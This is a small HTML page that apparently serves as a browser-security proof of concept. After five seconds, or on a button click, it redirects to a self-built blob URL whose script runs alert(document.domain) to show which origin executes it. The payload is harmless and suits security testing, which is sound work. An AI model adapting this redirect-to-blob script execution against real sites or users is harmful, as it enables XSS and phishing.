<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        // JavaScript that creates a Blob URL with an alert
        function createAndRedirectToBlob() {
            const blobContent = `
                <!DOCTYPE html>
                <html>
                <head><title>Alert Page</title></head>
                <body>
                    <script>
                        alert(document.domain);
                    <\/script>
                </body>
                </html>
            `;

            const blob = new Blob([blobContent], { type: 'text/html' });
            const blobURL = URL.createObjectURL(blob);
            window.location.href = blobURL;
        }

        // Automatically redirect after 5 seconds
        window.onload = function() {
            setTimeout(createAndRedirectToBlob, 5000);
        };
    </script>
</head>
<body>
    <h1>Redirecting in 5 seconds...</h1>
    <p>If you are not redirected automatically, click the button below:</p>
    <button onclick="createAndRedirectToBlob()">Go Now</button>
</body>
</html>
